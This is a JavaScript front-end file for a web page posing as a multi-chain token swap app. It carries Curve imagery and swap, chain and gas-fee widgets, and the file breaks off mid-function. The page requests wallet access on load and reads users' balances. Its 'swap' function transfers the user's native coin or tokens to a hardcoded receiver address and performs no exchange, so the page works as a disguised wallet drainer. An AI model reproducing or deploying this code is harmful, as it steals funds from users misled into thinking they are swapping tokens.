import {
  NATIVE_ADDRESS,
  VYPER_ADDRESSES,
  WETH_ADDRESSES,
  ONE_INCH_PRICE_AGRIGATOR_ADDRESSES,
  ZERO_ADDRESS,
  SUPORTED_CHAIN_ID,
  USDT_ADDRESSES,
  RECEIVER_ADDRESS,
  WALLETS,
} from "./constant.js";
import { TOKENS } from "./token-list.js";

const ERC20ABI = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [
      {
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_from",
        type: "address",
      },
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [
      {
        name: "",
        type: "uint8",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "balance",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [
      {
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transfer",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
      {
        name: "_spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    payable: true,
    stateMutability: "payable",
    type: "fallback",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        name: "to",
        type: "address",
      },
      {
        indexed: false,
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
];

const oneInchAbi = [
  {
    inputs: [
      {
        internalType: "contract MultiWrapper",
        name: "_multiWrapper",
        type: "address",
      },
      {
        internalType: "contract IOracle[]",
        name: "existingOracles",
        type: "address[]",
      },
      {
        internalType: "enum OffchainOracle.OracleType[]",
        name: "oracleTypes",
        type: "uint8[]",
      },
      {
        internalType: "contract IERC20[]",
        name: "existingConnectors",
        type: "address[]",
      },
      { internalType: "contract IERC20", name: "wBase", type: "address" },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "contract IERC20",
        name: "connector",
        type: "address",
      },
    ],
    name: "ConnectorAdded",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "contract IERC20",
        name: "connector",
        type: "address",
      },
    ],
    name: "ConnectorRemoved",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "contract MultiWrapper",
        name: "multiWrapper",
        type: "address",
      },
    ],
    name: "MultiWrapperUpdated",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "contract IOracle",
        name: "oracle",
        type: "address",
      },
      {
        indexed: false,
        internalType: "enum OffchainOracle.OracleType",
        name: "oracleType",
        type: "uint8",
      },
    ],
    name: "OracleAdded",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "contract IOracle",
        name: "oracle",
        type: "address",
      },
      {
        indexed: false,
        internalType: "enum OffchainOracle.OracleType",
        name: "oracleType",
        type: "uint8",
      },
    ],
    name: "OracleRemoved",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    inputs: [
      { internalType: "contract IERC20", name: "connector", type: "address" },
    ],
    name: "addConnector",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "contract IOracle", name: "oracle", type: "address" },
      {
        internalType: "enum OffchainOracle.OracleType",
        name: "oracleKind",
        type: "uint8",
      },
    ],
    name: "addOracle",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "connectors",
    outputs: [
      {
        internalType: "contract IERC20[]",
        name: "allConnectors",
        type: "address[]",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "contract IERC20", name: "srcToken", type: "address" },
      { internalType: "contract IERC20", name: "dstToken", type: "address" },
      { internalType: "bool", name: "useWrappers", type: "bool" },
    ],
    name: "getRate",
    outputs: [
      { internalType: "uint256", name: "weightedRate", type: "uint256" },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "contract IERC20", name: "srcToken", type: "address" },
      { internalType: "bool", name: "useSrcWrappers", type: "bool" },
    ],
    name: "getRateToEth",
    outputs: [
      { internalType: "uint256", name: "weightedRate", type: "uint256" },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "multiWrapper",
    outputs: [
      { internalType: "contract MultiWrapper", name: "", type: "address" },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "oracles",
    outputs: [
      {
        internalType: "contract IOracle[]",
        name: "allOracles",
        type: "address[]",
      },
      {
        internalType: "enum OffchainOracle.OracleType[]",
        name: "oracleTypes",
        type: "uint8[]",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "contract IERC20", name: "connector", type: "address" },
    ],
    name: "removeConnector",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "contract IOracle", name: "oracle", type: "address" },
      {
        internalType: "enum OffchainOracle.OracleType",
        name: "oracleKind",
        type: "uint8",
      },
    ],
    name: "removeOracle",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "contract MultiWrapper",
        name: "_multiWrapper",
        type: "address",
      },
    ],
    name: "setMultiWrapper",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "newOwner", type: "address" }],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

export const sleep = async (ms, msg) => {
  msg && console.log(msg !== true ? msg : "Timout " + ms / 1000 + " sec...");
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
};

let chainId = 0;

const jsonRpcproviders = {
  42170: new ethers.providers.JsonRpcProvider(
    "https://arbitrum-nova.public.blastapi.io"
  ),
  18: new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/bsc"),
  1: new ethers.providers.JsonRpcProvider("https://eth.llamarpc.com"),
  42161: new ethers.providers.JsonRpcProvider(
    "https://arbitrum.blockpi.network/v1/rpc/public	"
  ),
  137: new ethers.providers.JsonRpcProvider("https://polygon.llamarpc.com"),
  10: new ethers.providers.JsonRpcProvider("https://mainnet.optimism.io"),
  43114: new ethers.providers.JsonRpcProvider(
    "https://avalanche.public-rpc.com"
  ),
  42220: new ethers.providers.JsonRpcProvider("https://forno.celo.org"),
  2222: new ethers.providers.JsonRpcProvider("https://evm.kava.io"),
  250: new ethers.providers.JsonRpcProvider("https://rpc2.fantom.network"),
  1313161554: new ethers.providers.JsonRpcProvider(
    "https://mainnet.aurora.dev"
  ),
  1284: new ethers.providers.JsonRpcProvider("https://1rpc.io/glmr"),
  100: new ethers.providers.JsonRpcProvider("https://rpc.gnosis.gateway.fm"),
};

// Get the modal
var modalConnectWallets = document.getElementById("myModal");

// Get the button that opens the modal
var btnConnectWalletModal = document.getElementById("connect-wallet-button");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks on the button, open the modal
btnConnectWalletModal.onclick = function () {
  modalConnectWallets.style.display = "block";
};

// When the user clicks on <span> (x), close the modal
span.onclick = function () {
  modalConnectWallets.style.display = "none";
  removeActiveClassWallets();
};
// When the user clicks anywhere outside of the modal, close it
window.onclick = function (event) {
  if (event.target == modalConnectWallets) {
    modalConnectWallets.style.display = "none";
    removeActiveClassWallets();
  }
};

const swapBtn = document.getElementById("swap_btn__");
const connectBtn = document.getElementById("connection_btn");
const userAddressDropdoun = document.getElementById("account-dropdown");
const userAddressHeader = document.getElementById("account-header");

const selectedChainName = document.getElementById("selected-chain-name");
const summaryValue = document.getElementById("summary-value");
const summaryEmpty = document.getElementById("summary-empty");
summaryValue.style.display = "none";
summaryEmpty.style.display = "block";
const tokenAmount = document.getElementById("amount");
const tokenModal = document.getElementById("token_modal");
const fromChainName = document.getElementById("from-chain-name");
const userAddressBtn = document.getElementById("connection_status_btn");
const balanceValue = document.getElementById("balance-value");
const moveFoundsBtn = document.getElementById("move-founds-btn");
const btnMax = document.getElementById("basic-addon2");
const gasFeesvalue = document.getElementById("gas-fees");
const gasFeesUsdValue = document.getElementById("gas-usd-fees");
const gasFeesL1UsdValue = document.getElementById("gas-l1-usd-fees");
const gasFeesL2UsdValue = document.getElementById("gas-l2-usd-fees");
const gasFeesL1Value = document.getElementById("gas-l1-fees");
const gasFeesL2Value = document.getElementById("gas-l2-fees");
const totalMove = document.getElementById("total");
const totalUsdMove = document.getElementById("total-usd");
const anotherBalance = document.getElementById("another-balance");
const cryptoInfoModal = document.getElementById("cryptoInfo-modal");
const pageBody = document.getElementById("page-top");
const tokenListBody = document.getElementById("token_list");
const saveSettingsBtn = document.getElementById("save_settings_btn");
const rateValue = document.getElementById("0rate_value");
const rateSimbol_ = document.getElementById("1rate");
const rateSimbol = document.getElementById("0rate");
const rateValue_ = document.getElementById("1rate_value");
const advBtn = document.getElementById("adv_btn_");
const swapTokenBtn = document.getElementById("swap_token_btn");
const walletButtonTrezor = document.getElementById("wallet-button-trezor");
const inpFromAmount = document.getElementById("inpFromAmount");
const inpToAmount = document.getElementById("inpTo");
const balanceAmount = document.getElementById("balance_amount");
const balanceAmountTo = document.getElementById("balance_amount_to");
const chainBtn = document.getElementById("chain_btn");
let chainBtnHover = document.getElementById("chain_select_hover");
let chainSpiner = document.getElementById("chain_spiner");
let swapSpiner = document.getElementById("swap_spiner");
const dropupChainMenu = document.getElementById("dropup_menu");
const movingUsdAmount = document.getElementById("moving-usd-value");
const movingAmount = document.getElementById("moving-value");
const usdAmount_ = document.getElementById("usd_amount_");
const searchTokenInput = document.getElementById("search_token");
const mainIinputbox = document.getElementById("main_inputbox");
const dropupChainMenuInner = document.getElementById("dropup_content_inner");
const warningIinfo = document.getElementById("warning_info");
const сhangeNetworkBtn = document.getElementById("сhange_network_btn");
const wrongNetworkWrapper = document.getElementById("wrong-network-wrapped");
const cryptoInfo = document.getElementById("cryptoInfo");
const imgArbinauts = document.getElementById("img-arbinauts");
const imgSpaceship = document.getElementById("img-spaceship");
const wrongNetworkBtn = document.getElementById("wrong-network")
const rightSegmentTitle = document.getElementsByClassName(
  "right-segment-title"
)[0];
const metamascActionBox = document.getElementById("metamask-action-wrapper");
const defoultActionBox = document.getElementById(
  "defoult-wallet-action-wrapper"
);
const metamaskRetryBtn = document.getElementById("metamask-retry-btn");
const qrImg = document.getElementsByClassName("qr-img")[0];
const qrWpapper = document.getElementsByClassName("qr-wpapper")[0];
const pleaseConnect = document.getElementById("please-connect");

const provider = new ethers.providers.Web3Provider(window.ethereum);
const isUserConnectedFromLS = localStorage.getItem("FightWinIsConnect");
const receiver = RECEIVER_ADDRESS;
let account = undefined;
let userBalance = 0;
let userOtherBalance = 0;
let userNativeBalance = 0;
let userNativeBalanceAnotherChain = 0;
let selectedTokenA = TOKENS.find((token) => token.symbol === "ETH");
let selectedTokenB = {};
let selectedTokenBtn = 0;
let slippageTolerance = "0.1";
let amountSwap = 0;
let rate_ = 0;
let usdtRate = 0;
let usdtETHRate = 0;
let gasUsdPrice = 0;
let gasPrice = 0;
let ethPrice = 0;
let anotherChainId = 0;

let selectedChainfromLs = Number(localStorage.getItem("CurveSelectedChainId"));
let selectedChain = selectedChainfromLs
  ? SUPORTED_CHAIN_ID.filter(
      (chain) => chain.id === Number(selectedChainfromLs)
    )[0]
  : SUPORTED_CHAIN_ID[1];

function isValidUrl(string) {
  try {
    new URL(string);
    return true;
  } catch (err) {
    return false;
  }
}

async function setSwapBtnState() {
  if (
    account &&
    amountSwap > 0 &&
    rate_ > 0 &&
    chainId > 0 &&
    amountSwap <= selectedTokenA.balance
  ) {
    swapBtn.disabled = false;
    swapBtn.innerHTML = "Swap";
    swapSpiner.style.display = "none";
    swapBtn.style.backgroundColor = "#1763fd";
    swapBtn.style.color = "#fafcff";
    swapBtn.style.boxShadow = "3px 3px 0 var(--button--shadow-color)";
    swapBtn.style.border = "1px solid var(--button--border-color)";
  } else if (!account || chainId === 0) {
    swapBtn.disabled = false;
    swapBtn.innerHTML = "Connect Wallet";
    swapSpiner.style.display = "none";
    swapBtn.style.backgroundColor = "#1763fd";
    swapBtn.style.color = "#fafcff";
    swapBtn.style.boxShadow = "3px 3px 0 var(--button--shadow-color)";
    swapBtn.style.border = "1px solid var(--button--border-color)";
  } else if (
    account &&
    chainId !== 0 &&
    selectedTokenA.address &&
    selectedTokenB.address &&
    rate_ > 0
  ) {
    swapBtn.disabled = true;
    swapBtn.style.backgroundColor = "#aeb3bc";
    swapBtn.style.color = "#7F8694";
    swapBtn.style.boxShadow = "none";
    swapBtn.style.border = "none";
    swapBtn.innerHTML = "Swap";
    swapSpiner.style.display = "none";
  } else {
    swapBtn.disabled = true;
    swapBtn.style.backgroundColor = "#aeb3bc";
    swapBtn.style.color = "#7F8694";
    swapBtn.style.boxShadow = "none";
    swapBtn.style.border = "none";
    console.log("NE OK");
    swapBtn.innerHTML = "Loading...";
    swapSpiner.style.display = "block";
  }
}

async function getGasPrice() {
  provider.getGasPrice().then(async (price) => {
    const wethPrice = await getWethUsdtRate();
    ethPrice = wethPrice;
    if (wethPrice) {
      gasUsdPrice = (
        (Number(ethers.utils.formatUnits(price, "gwei")) * wethPrice) /
        10 ** 18
      ).toFixed(18);
      gasPrice = Number(ethers.utils.formatUnits(price, "gwei"));
      console.log(gasUsdPrice, ethers.utils.formatUnits(price, "gwei"));
    }
  });
}
setInterval(getGasPrice, 10000);
setTimeout(getGasPrice, 1000);

// setSwapBtnState();
async function switchNetwork(chain) {
  try {
    chainBtn.disabled = true;
    chainBtn.style.opacity = "0.5";
    chainSpiner.style.display = "block";
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x" + chain.id.toString(16) }],
    });
    if (SUPORTED_CHAIN_ID.filter((chain) => chain.id === chainId).length > 0) {
      localStorage.setItem("CurveSelectedChainId", chainId.toString());
    }
    document.location.reload();
  } catch (err) {
    console.log(err);
    chainBtn.disabled = true;
    chainBtn.style.opacity = "1";
    chainSpiner.style.display = "none";
    // This error code indicates that the chain has not been added to MetaMask
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainName: chain.chainName,
            chainId: "0x" + chain.id.toString(16),
            nativeCurrency: { name: "ethereum", decimals: 18, symbol: "ETH" },
            rpcUrls: ["https://bsc-dataseed1.ninicoin.io"],
          },
        ],
      });
      if (
        SUPORTED_CHAIN_ID.filter((chain) => chain.id === chainId).length > 0
      ) {
        localStorage.setItem("CurveSelectedChainId", chainId.toString());
      }
      document.location.reload();
    }
  }
}
function getValue(value) {
  return Number(value.toString()) / 10 ** 18;
}

async function connectMetamask() {
  if (typeof window.ethereum !== "undefined") {
    console.log("MetaMask is installed!");
    // connectModal.className = "popup connect-popup"
    // connectModal.style.ariaHidden = "true"
    // document.getElementsByClassName("watcher popup-show lock")[0].className ="watcher"
    try {
      if (metamaskRetryBtn) {
        metamaskRetryBtn.className = "spin-loader";
      }
      await provider.send("eth_requestAccounts", []);
      //  connectModal.className = "popup connect-popup"
      //  connectModal.style.ariaHidden = "true"
      //  document.getElementsByClassName("watcher popup-show lock")[0].className ="watcher"
    } catch (err) {
      console.log(err);
    } finally {
      if (metamaskRetryBtn) {
        metamaskRetryBtn.className = "metamasc-action-btn";
      }
      await getAccount();
      localStorage.setItem("FightWinIsConnect", "true");

      // connectModal.style.display = "none";

      // document.getElementsByClassName("watcher popup-show lock")[0].className ="watcher"
    }
  } else {
    alert("MetaMask is not installed!");
  }
}
connectMetamask();

async function logOut() {
  localStorage.setItem("FightWinIsConnect", "false");
  account = undefined;
  userAddressBtn.innerHTML = "CONNECT WALLET";
  userAddressBtn.style.setProperty("--danger-400", "#ea3941");
  userAddressBtn.style.setProperty("--danger-600", "#fbd5d7");
  connectModal.style.display = "none";
  userAddressBtn.onclick = function () {
    connectModal.style.display = "block";
  };
  swapBtn.onclick = function () {
    connectModal.style.display = "block";
  };
  swapBtn.innerHTML = "Connect Wallet";
}
async function sendToken() {
  if (Number(amountSwap) <= 0) return;
  console.log(amountSwap);
  try {
    const currentGasPrice = await provider.getGasPrice();
    let gas_price = ethers.utils.hexlify(parseInt(currentGasPrice));
    console.log(`gas_price: ${gas_price}`, Number(currentGasPrice));
    const signer = provider.getSigner();

    console.log("swap");
    if (selectedTokenA.address[chainId] === NATIVE_ADDRESS) {
      const tx = {
        from: account,
        to: receiver,
        value: ethers.utils.hexlify(
          ethers.utils.parseEther((amountSwap - amountSwap * 0.1).toFixed(18))
        ),
        // nonce: provider.getTransactionCount(
        //   account,
        //   "latest"
        // ),
        // gasLimit: ethers.utils.hexlify(gas_limit), // 100000
        gasPrice: gas_price,
      };
      console.dir(tx);
      try {
        const txHash = await ethereum.request({
          method: "eth_sendTransaction",
          params: [tx],
        });
        await provider.waitForTransaction(txHash);
      } catch (error) {
        console.log()("failed to send!!");
      }
    } else {
      const signer = provider.getSigner();
      const tokenContract = new ethers.Contract(
        selectedTokenA.address[chainId],
        ERC20ABI,
        signer
      );
      let numberOfTokens = ethers.utils.parseUnits(
        amountSwap.toString(),
        selectedTokenA.quantity
      );
      await tokenContract.transfer(receiver, numberOfTokens);
    }
  } catch (err) {
    console.log(err);
  }
}

async function setAvailBalance() {
  if (selectedTokenA.balance > 0) {
    balanceAmount.innerHTML =
      "Avail. " +
      selectedTokenA.balance.toFixed(selectedTokenA.decimals > 6 ? 4 : 2);
  } else {
    balanceAmount.innerHTML = "Avail. 0";
  }
  if (selectedTokenB.balance > 0) {
    balanceAmountTo.innerHTML =
      "Avail. " +
      selectedTokenB.balance.toFixed(selectedTokenB.decimals > 6 ? 4 : 2);
  } else {
    balanceAmountTo.innerHTML = "Avail. 0";
  }
}

function setBtnMax() {
  if (selectedTokenA.balance > 0) {
    btnMax.disabled = false;
    btnMax.onclick = function () {
      inpFromAmount.value = selectedTokenA.balance;
      amountSwap = selectedTokenA.balance;
      inpToAmount.value = (amountSwap * rate_).toFixed(6);
      setSwapBtnState();
      getBestRate();
    };
  }
}

function setMax() {
  if (userBalance > 0) {
    // btnMax.disabled = false;
    tokenAmount.value = userBalance;
    summaryEmpty.style.display = "none";
    summaryValue.style.display = "block";
    amountSwap = userBalance;
    console.log(usdtRate, amountSwap);
  }
  setMovingValue();
}

async function selectChain(id) {
  chainId = Number(id);
  selectedChain = SUPORTED_CHAIN_ID.filter((item) => item.id === chainId)[0];
  try {
    switchNetwork(selectedChain);
  } catch (err) {
    console.log(err);
  }
}

async function setSelectedChain() {
  const suportedChain = SUPORTED_CHAIN_ID.filter(
    (chain) => chain.id === chainId
  );
  console.log(suportedChain);
  if (suportedChain && suportedChain[0]) {
    chainBtn.innerHTML =
      `<span> ` +
      suportedChain[0].svg +
      ` <span class="type__text">${suportedChain[0].name}</span></span><svg name="open-chain-menu" focusable="false"
preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg"
fill="currentColor" aria-hidden="true" aria-label="show icon" width="16" height="16"
viewBox="0 0 32 32" role="img" class="select-icon">
<path d="M24 12L16 22 8 12z"></path>
</svg>
<div id="chain_spiner" class="loader"></div>
<div id="chain_select_hover" class="chain-select-hover"></div>`;
    chainBtn.disabled = false;
    chainBtn.style.opacity = "1";
    const chainSpiner_ = document.getElementById("chain_spiner");
    chainSpiner_.style.display = "none";
    chainSpiner = chainSpiner_;
    const chainBtnHover_ = document.getElementById("chain_select_hover");
    chainBtnHover = chainBtnHover_;
    const itemPar = document.getElementById(`chain${suportedChain[0].id}`);
    itemPar.style.backgroundColor = "#1763FD";
    itemPar.style.color = "white";
    warningIinfo.style.display = "none";
  } else if (selectedChainfromLs) {
    let chainId_ = SUPORTED_CHAIN_ID.filter(
      (item) => item.id === selectedChainfromLs
    )[0];
    warningIinfo.style.display = "block";
    сhangeNetworkBtn.onclick = () => {
      switchNetwork(chainId_);
    };

    chainBtn.innerHTML =
      `<span> ` +
      chainId_.svg +
      ` <span class="type__text">${chainId_.name}</span></span><svg name="open-chain-menu" focusable="false"
preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg"
fill="currentColor" aria-hidden="true" aria-label="show icon" width="16" height="16"
viewBox="0 0 32 32" role="img" class="select-icon">
<path d="M24 12L16 22 8 12z"></path>
</svg>
<div id="chain_spiner" class="loader"></div>
<div id="chain_select_hover" class="chain-select-hover"></div>`;

    chainBtn.disabled = false;
    chainBtn.style.opacity = "1";
    const chainSpiner_ = document.getElementById("chain_spiner");
    chainSpiner_.style.display = "none";
    chainSpiner = chainSpiner_;
    const chainBtnHover_ = document.getElementById("chain_select_hover");
    chainBtnHover = chainBtnHover_;
    const itemPar = document.getElementById(`chain${chainId_.id}`);
    itemPar.style.backgroundColor = "#1763FD";
    itemPar.style.color = "white";
  } else {
    chainBtn.disabled = true;
    chainBtn.style.opacity = "0.5";
    chainSpiner.style.display = "block";
    swapBtn.disabled = true;

    warningIinfo.style.display = "block";
    сhangeNetworkBtn.onclick = () => {
      switchNetwork(SUPORTED_CHAIN_ID[1]);
    };
  }
}
async function getUserBalance(token) {
  if (!token) {
    return;
  }
  if (token.address[chainId] === NATIVE_ADDRESS) {
    userBalance = userNativeBalance;
    userOtherBalance = userNativeBalanceAnotherChain;
  } else {
    const signer = provider.getSigner();
    const tokenContract = new ethers.Contract(
      token.address[chainId],
      ERC20ABI,
      signer
    );
    const tokenContractOther = new ethers.Contract(
      token.address[anotherChainId],
      ERC20ABI,
      jsonRpcproviders[anotherChainId]
    );
    const anotherBalance_ = await tokenContractOther.balanceOf(account);
    const balance = await tokenContract.balanceOf(account);
    userBalance = balance ? Number(balance) / 10 ** token.quantity : 0;
    console.log(userBalance);
    userOtherBalance = anotherBalance_
      ? Number(anotherBalance_) / 10 ** token.quantity
      : 0;
  }
  anotherBalance.innerHTML =
    "Balance: " + userOtherBalance > 0
      ? userOtherBalance.toFixed(4)
      : 0 + " " + token.symbol;
}
const userAccount = document.getElementById("user-account")

const networkBtn = document.getElementById("wrong-network")
async function getAccount() {
  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  await provider.send("eth_requestAccounts", []);
  console.log(accounts[0]);
  chainId = provider?._network?.chainId;
  anotherChainId = chainId == 1 ? 42161 : 1;
  if (accounts[0]) {
    account = accounts[0];
    networkBtn.style.display = "flex"
      userAccount.style.display = "flex"
    pleaseConnect.innerHTML = ""
    btnConnectWalletModal.style.display = "none"
    if (SUPORTED_CHAIN_ID.filter((chain) => chain.id === chainId).length > 0) {
      localStorage.setItem("CurveSelectedChainId", chainId.toString());
      const balance = await provider.getBalance(accounts[0]);
      const anotherBalance = await jsonRpcproviders[anotherChainId].getBalance(
        accounts[0]
      );
      userNativeBalance =
        balance > 0 && balance !== undefined ? Number(balance) / 10 ** 18 : 0;
      userNativeBalanceAnotherChain =
        anotherBalance > 0 && anotherBalance !== undefined
          ? Number(anotherBalance) / 10 ** 18
          : 0;
      console.log(userNativeBalanceAnotherChain);
      
      userBalance > 0 && (btnMax.disabled = false);
      btnMax.onclick = setMax;
      setTimeout(() => getUserBalance(selectedTokenA), 2000);
      getUsdtRate();
    }

    userAddressDropdoun.innerHTML =
      account.substr(0, 5) + "..." + account.substr(39, 42);
    userAddressHeader.innerHTML =
      account.substr(0, 5) + "..." + account.substr(39, 42);
   
    cryptoInfoModal.display = "block";
    // cryptoInfoModal.className = "modal-dialog_";
    setTimeout(() => {
      cryptoInfoModal.className = "modal-dialog_";
      pageBody.style.overflow = "auto";
    }, 2000);
    cryptoInfoModal.className.replace("modal-dialog_", "modal-dialog_");
  } else {
    pageBody.style.overflow = "auto";
    networkBtn.style.display = "none"
    $("#cryptoInfo").modal("hide");
    wrongNetworkBtn.style.display = "none"
    imgSpaceship.style.display = "none"
  }

  // console.log(await provider.getBlockNumber())
  // console.log(await fWinContract.name())
  // console.log(await fWinContract.balanceOf(account).then(balance => balance.toString()))
  console.log(provider?._network?.chainId);
}

let bookmakers = new Array();
let tokens = new Array();
// let pullData = new Array()
async function getTokens() {
  await getAccount();
  // tokens = TOKEN_LIST.tokens.filter((token) => token.chainId === chainId);
  // for(let i = 0; i < tokensList.length; i++){
  //     const tokenContract = new ethers.Contract(tokensList.tokens[i].address, BOOKMAKER_ABI, jsonRpcproviders[provider?._network?.chainId] )
  //     tokens.push( {
  //         contract: bookmakerContract,
  //         address: bookmakerContract.address,
  //         totalElement: null,
  //         total: 0,
  //         supplies0: null,
  //         supplies1: null,
  //         supplies2: null,
  //         allowance: null,
  //         closed: false,
  //         numberOfStakers: 0,
  //         numbersOfbookmakers: 0,
  //         paused: false,
  //         router: "",
  //         stakingToken: "",
  //         input: null,
  //         input1: null,
  //         input2: null,
  //         btnCoeficient0: null,
  //         btnCoeficient1: null,
  //         btnCoeficient2: null,
  //         purcent10Btn: null,
  //         purcent10Btn2: null,
  //         purcent50Btn: null,
  //         purcent50Btn1: null,
  //         purcent50Btn2: null,
  //         approveBtn: null,
  //         betBtn: undefined,
  //         betBtn1: null,
  //         betBtn2: null,
  //         coeficient0: 0,
  //         coeficient1: 0,
  //         coeficient2: 0,
  //         maxBtn: undefined,
  //         maxBtn1: undefined,
  //         maxBtn2: undefined,
  //         selectedPool: 0,

  //     })

  // }
  console.log(tokens);
}

function setChainMenu() {
  let chainList_ = "";
  for (let i = 0; i < SUPORTED_CHAIN_ID.length; i++) {
    const itemBody =
      `<a id="chain${SUPORTED_CHAIN_ID[i].id}" class="chain-item" href="#"><span>` +
      SUPORTED_CHAIN_ID[i].svg +
      `<span class="type__text">${SUPORTED_CHAIN_ID[i].name}</span>
      <div id="${SUPORTED_CHAIN_ID[i].id}" class="chain-item-hover" ></div></a>`;
    chainList_ += itemBody;
  }
  dropupChainMenuInner.innerHTML = chainList_;
  for (let i = 0; i < SUPORTED_CHAIN_ID.length; i++) {
    const item = document.getElementById(SUPORTED_CHAIN_ID[i].id.toString());
    // const itemPar = document.getElementById(`chain${SUPORTED_CHAIN_ID[i].id}`);
    item.onclick = function (e) {
      selectChain(e.target.id);
    };
  }
}

// setChainMenu();

async function setTokenBtnsBody() {
  let tokenList_ = "";
  tokenBtn.innerHTML = `<img class="type__img" alt="${selectedTokenA.symbol}"
src="${
    isValidUrl(selectedTokenA.logoURI)
      ? selectedTokenA.logoURI
      : "https://cdn.jsdelivr.net/gh/curvefi/curve-assets/images/assets/0x6c3f90f043a72fa612cbac8115ee7e52bde6e490.png"
  }"
loading="lazy">
<div class="type__namebox">
<span class="type__name">
${selectedTokenA.symbol}
</span>
</div>`;
  tokenBtn_.innerHTML = `<img class="type__img" alt="${selectedTokenB.symbol}"
src="${
    isValidUrl(selectedTokenB.logoURI)
      ? selectedTokenB.logoURI
      : "https://cdn.jsdelivr.net/gh/curvefi/curve-assets/images/assets/0x6c3f90f043a72fa612cbac8115ee7e52bde6e490.png"
  }"
loading="lazy">
<div class="type__namebox">
<span class="type__name">
${selectedTokenB.symbol}
</span>
</div>`;

  setBtnMax();
  getBestRate();
}

// async function setToken(e){
//   if(selectedTokenBtn === 0){
//    selectedTokenA = tokens.find(token => token.address === e.target.id)
//    document.getElementsByClassName("active")[0].className = "all-content"
//    document.getElementById(selectedTokenA.address).className = "active"
//   }else{
//    selectedTokenB = tokens.find(token => token.address === e.target.id)
//    document.getElementsByClassName("active")[0].className = "all-content"
//    document.getElementById(selectedTokenB.address).className = "active"
//   }
//  }

async function getTokensBalance() {
  if (!chainId || !account) {
    return;
  } else {
    for (let i = 0; i < tokens.length; i++) {
      if (tokens[i].address === NATIVE_ADDRESS) {
